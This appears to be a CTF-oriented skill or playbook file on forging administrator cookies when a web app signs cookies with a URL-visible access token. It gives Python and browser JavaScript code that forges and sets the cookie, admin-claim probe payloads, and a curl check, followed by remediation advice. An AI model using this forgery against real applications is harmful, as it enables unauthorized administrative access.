# Cookie HMAC Key Reuse → Admin Auth Bypass

> When the server reuses a URL-visible access token as its Cookie signing key, and the admin backend directly trusts claim fields inside the Cookie payload, an attacker can forge an administrator identity.

---

## Applicable scenarios

- Target is a web application whose URL path contains `access_token` / `token` / `key` style parameters
- Response headers set a signed Cookie (e.g. `student_gate=<payload>.<signature>`)
- Multiple signed Cookies (student side + admin side) may share one key
- The backend Cookie payload contains client-controllable privilege claims (e.g. `{"admin":true}`)

## Keywords

- HMAC key reuse / shared signing key
- Known-key session forgery
- Client-side claims-based auth
- Cookie signature bypass

## Attack flow

### Step 1: Extract the access token from the URL

The entry URL usually shows:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract the token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: Observe the student_gate Cookie

Visit the entry point; the response headers set a signed Cookie. The format is usually:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload and confirm its structure.

### Step 3: Verify the signature algorithm

Use the known access token as the HMAC key and try to reproduce the signature:

```python
import hmac, hashlib, base64

access_token = "token extracted from the URL"
payload_b64 = "payload segment extracted from the Cookie"
expected_sig = "signature segment extracted from the Cookie"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("match" if computed == expected_sig else "no match")
```

If it matches → confirmed that `the access token is the HMAC key`.

### Step 4: Guess admin Cookie names and payload structures

Common admin-side Cookie names:

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload structure probes (try one at a time until you hit a 200):

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: Forge the admin Cookie

```python
import hmac, hashlib, json, base64

access_token = "the known token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: Verify backend access

```bash
curl -k -H "Cookie: <the cookie from the previous step>" https://target/api/admin/me
```

A response of `{"admin":true}` or 200 + admin data means success.

## Browser reproduction

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Remediation

1. Sign Cookies with a dedicated server-side key that is never shared with the URL token
2. Base backend authorization on a server-side session, not client-controlled Cookie payload claims
3. Use different signing keys per role
4. Add and validate claims such as `iat` / `exp` / `typ` inside the Cookie
5. Handle signature-parsing exceptions silently (return 401 on failure, not 500)

## Related cases

- class.pangbaoba.me CTF lab backend bypass (student_gate and admin_session shared the access token as the HMAC key; `{"admin":true}` granted admin privileges directly)

## Related skills

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — web runtime analysis
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — similar token claim confusion
- `reverse-engineering/languages-platforms.md` — JWT / OAuth related
